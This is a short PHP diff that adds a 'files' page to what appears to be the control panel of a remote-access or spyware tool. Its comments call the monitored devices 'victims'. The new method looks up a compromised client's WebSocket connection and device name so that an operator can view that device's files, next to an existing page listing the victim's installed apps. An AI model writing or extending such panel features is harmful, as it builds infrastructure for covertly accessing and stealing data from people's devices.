@@ -132,6 +132,32 @@ class ControlPanel extends Base
     }
 
     /**
+     * Get victim's files
+     */
+    public function files(): void
+    {
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
+
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/files.php',
+            [
+                'webSocketID' => $webSocketID,
+                'device' => $device,
+            ]
+        );
+    }
+
+    /**
      * Get victim's installed application
      */
     public function installedApps(): void
